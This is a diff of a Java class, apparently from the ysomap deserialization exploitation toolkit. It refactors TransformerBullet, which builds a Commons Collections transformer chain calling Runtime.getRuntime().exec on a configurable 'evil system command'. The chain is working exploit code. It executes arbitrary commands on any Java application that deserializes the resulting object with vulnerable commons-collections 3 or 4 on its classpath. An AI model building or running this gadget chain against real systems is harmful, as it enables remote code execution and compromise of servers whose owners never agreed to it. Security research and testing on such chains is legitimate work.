@@ -2,9 +2,8 @@ package ysomap.gadget.bullet.collections;
 
 import ysomap.annotation.Authors;
 import ysomap.annotation.Dependencies;
-import ysomap.gadget.ObjectGadget;
+import ysomap.annotation.Require;
 import ysomap.gadget.bullet.Bullet;
-import ysomap.util.PayloadHelper;
 import ysomap.util.Reflections;
 
 import java.lang.reflect.Array;
@@ -15,32 +14,24 @@ import java.util.LinkedList;
  * @since 2020/2/16
  */
 @SuppressWarnings ( "rawtypes" )
-@Dependencies({"set --args command --args version"})
+@Dependencies({"*"})
 @Authors({ Authors.WH1T3P1G })
 public class TransformerBullet extends Bullet<Object> {
 
-    String args;
+    @Require(name="args",detail="evil system command")
+    public String args;
+    @Require(name="version", type="int", detail = "commons-collections version, plz choose 3 or 4")
+    public String version = "3";// 默认生成commonscollections 3.2.1
 
-    String version = "3";// 默认生成commonscollections 3.2.1
+    public Class transformerClazz;
 
-    Class transformerClazz;
+    public Class constantTransformerClazz;
 
-    Class constantTransformerClazz;
-
-    Class invokerTransformerClazz;
-
-    public TransformerBullet(String args, String version) {
-        this.args = args == null? PayloadHelper.defaultTestCommand() : args;
-        this.version = version.equals("3") ? "3" : "4";
-        try {
-            initClazz();
-        } catch (ClassNotFoundException e) {
-            e.printStackTrace();
-        }
-    }
+    public Class invokerTransformerClazz;
 
     @Override
     public Object getObject() throws Exception {
+        initClazz();
         LinkedList<Object> transformers = new LinkedList<>();
         transformers.add(createConstantTransformer(Runtime.class));
         transformers.add(createInvokerTransformer("getMethod", new Class[] {String.class, Class[].class },
@@ -52,6 +43,10 @@ public class TransformerBullet extends Bullet<Object> {
         transformers.add(createConstantTransformer(1));
 
         return createTransformerArray(transformers);
+    }
+
+    public void setArgs(String args) {
+        this.args = args;
     }
 
     public void setVersion(String version) {
@@ -91,16 +86,5 @@ public class TransformerBullet extends Bullet<Object> {
         return Reflections.newInstance(invokerTransformerClazz.getName(),
                             new Class[]{String.class, Class[].class, Object[].class},
                             args);
-    }
-
-
-    public static void main(String[] args) {
-        ObjectGadget bullet = new TransformerBullet(null,"4");
-        try {
-            Object obj = bullet.getObject();
-            System.out.println(obj);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
     }
 }
